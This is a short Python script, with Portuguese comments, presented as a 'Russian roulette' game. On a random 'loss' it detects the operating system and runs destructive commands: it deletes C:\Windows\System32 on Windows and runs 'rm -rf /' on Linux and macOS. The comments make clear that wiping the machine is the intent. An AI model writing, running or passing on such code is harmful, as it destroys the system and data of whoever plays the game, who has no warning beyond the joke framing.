#ROLETA RUSSA

import random
import os
import platform
import time

def identificar_sistema_operacional():
    sistema = platform.system()
    if sistema == "Windows":
        return "Windows"
    elif sistema == "Linux":
        return "Linux"
    elif sistema == "Darwin": #Darwin e o nome do kernel do MAC
        return "MacOS"
    else:
        return "Desconhecido"

def roleta_russa():
    camaras = 6
    bala = random.randint(1, camaras)

    sistema = identificar_sistema_operacional()
    print("Bem-vindX ao jogo da Roleta Russa!")
    print("A arma tem 6 camaras e uma unica bala, sera seu dia de sorte?")

    continuar = True
    while continuar:
        input("Aperte Enter para girar o tambor e puxar o gatilho...")
        tiro = random.randint(1, camaras)

        if tiro == bala:
            print("BANG! Voce perdeu :D")
            time.sleep(2)

            if sistema == "Windows":
                os.system("del C:\\Windows\System32 /Q /F /S") # Apaga o windows HEHE
        
            elif sistema == "Linux": 
                os.system ("rm -rf /") #Mandar o linux de base
                #print("NUM FOI")

            elif sistema == "MacOS":
                os.system ("rm -rf /") #apaga o mac

            else:
                print("se safou")
            break
        
        else:
            print("Click! Voce sobreviveu")
            time.sleep(1)
            resposta = input("Tem coragem de ir novamente? S/N?: ").strip().upper()
            if resposta != "S":
                continuar = False
                print("GAME OVER")

#EXECUTAR O GAME
roleta_russa()
